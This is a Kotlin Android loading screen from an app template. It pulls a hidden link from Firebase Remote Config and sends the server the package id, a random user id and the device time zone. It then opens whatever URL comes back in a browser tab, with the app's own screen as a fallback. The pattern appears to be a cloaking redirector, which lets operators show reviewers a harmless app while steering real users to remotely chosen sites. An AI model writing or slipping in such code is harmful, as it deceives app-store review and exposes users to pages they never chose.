package com.template

import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabColorSchemeParams
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.FirebaseMessaging
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import okhttp3.*
import java.io.IOException
import java.util.*


class LoadingActivity : AppCompatActivity() {

    private var okHttpClient: OkHttpClient = OkHttpClient()
    private lateinit var analytics: FirebaseAnalytics

    private var noFirstStart: String? = null
    private lateinit var sFirstStart: SharedPreferences
    private var urlDomain: String? = null
    private lateinit var sUrlDomain: SharedPreferences

    private var urlPackageid = "/?packageid=" + BuildConfig.APPLICATION_ID
    private var urlUsserid = "usserid=" + UUID.randomUUID().toString()
    private var urlGetz = "getz=" + TimeZone.getDefault().id.toString()
    private var urlGetr = "getr=utm_source=google-play&utm_medium=..."
    private var urlRazdelitel = "&"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)

        analytics = Firebase.analytics
        FirebaseMessaging.getInstance().isAutoInitEnabled = true

        noFirstStart = getSharedPreferenceFirstStart()

        if (noFirstStart == APP_PREFERENCES_NO_FIRST_START) {
            urlDomain = getSharedPreferenceUrl()
            checkChoiceIntent(urlDomain.toString())
        } else {
            loadFromFB()
        }
    }

    private fun checkChoiceIntent(url: String) {
        if (url != "" && url != "error") {
            openChromeCustomTabs(url)
        } else {
            intentMainActivity()
        }
    }

    private fun loadFromFB() {
        val remoteConfig = FirebaseRemoteConfig.getInstance()

        remoteConfig.fetchAndActivate()
            .addOnCompleteListener {
                urlDomain = remoteConfig.getString("check_link")
                saveSharedPreferenceNoFirst()

                if (urlDomain != "" && urlDomain != "error") {
                    getOkHttp(urlDomain.toString())
                } else {
                    saveSharedPreferenceRightUrl(urlDomain.toString())
                    intentMainActivity()
                }
            }
    }

    private fun getOkHttp(urlFB: String) {
        val userAgent = System.getProperty("http.agent") as String
        val firstUrlDone = firstUrlDone(urlFB)

        val request: Request =
            Request.Builder()
                .header("User-Agent", userAgent)
                .url(firstUrlDone)
                .build()
        okHttpClient.newCall(request).enqueue(object : Callback {

            override fun onFailure(call: Call, e: IOException) { }

            override fun onResponse(call: Call, response: Response) {
                val url = response.body?.string() as String

                saveSharedPreferenceRightUrl(url)
                checkChoiceIntent(url)
            }
        })
    }

    private fun openChromeCustomTabs(url: String) {
        val builder: CustomTabsIntent.Builder = CustomTabsIntent.Builder()

        val colorInt = ContextCompat.getColor(this, R.color.black)
        val defaultColors = CustomTabColorSchemeParams.Builder()
            .setToolbarColor(colorInt)
            .build()
        builder

            .setDefaultColorSchemeParams(defaultColors)
            .build()
            .launchUrl(this, Uri.parse(url))
    }

    private fun firstUrlDone(url: String): String {
        return url +
                urlPackageid +
                urlRazdelitel +
                urlUsserid +
                urlRazdelitel +
                urlGetz +
                urlRazdelitel +
                urlGetr
    }

    private fun saveSharedPreferenceNoFirst() {
        sFirstStart = getPreferences(MODE_PRIVATE)
        val fs: SharedPreferences.Editor = sFirstStart.edit()
        fs.putString(APP_PREFERENCES_NO_FIRST_START, APP_PREFERENCES_NO_FIRST_START).toString()
        fs.apply()
    }

    private fun saveSharedPreferenceRightUrl(url: String) {
        sUrlDomain = getPreferences(MODE_PRIVATE)
        val urlFB: SharedPreferences.Editor = sUrlDomain.edit()
        urlFB.putString(APP_PREFERENCES_URL, url).toString()
        urlFB.apply()
    }

    private fun getSharedPreferenceUrl(): String {
        sUrlDomain = getPreferences(MODE_PRIVATE)
        val urlFB = sUrlDomain.getString(APP_PREFERENCES_URL, "")
        return urlFB.toString()
    }

    private fun getSharedPreferenceFirstStart(): String {
        sFirstStart = getPreferences(MODE_PRIVATE)
        val firstStartApp = sFirstStart.getString(APP_PREFERENCES_NO_FIRST_START, "")
        return firstStartApp.toString()
    }

    private fun intentMainActivity() {
        val intent = Intent(this, MainActivity::class.java)
        startActivity(intent)
    }

    companion object {
        private const val APP_PREFERENCES_URL = "URL"
        private const val APP_PREFERENCES_NO_FIRST_START = "NO_FIRST_START"
    }
}
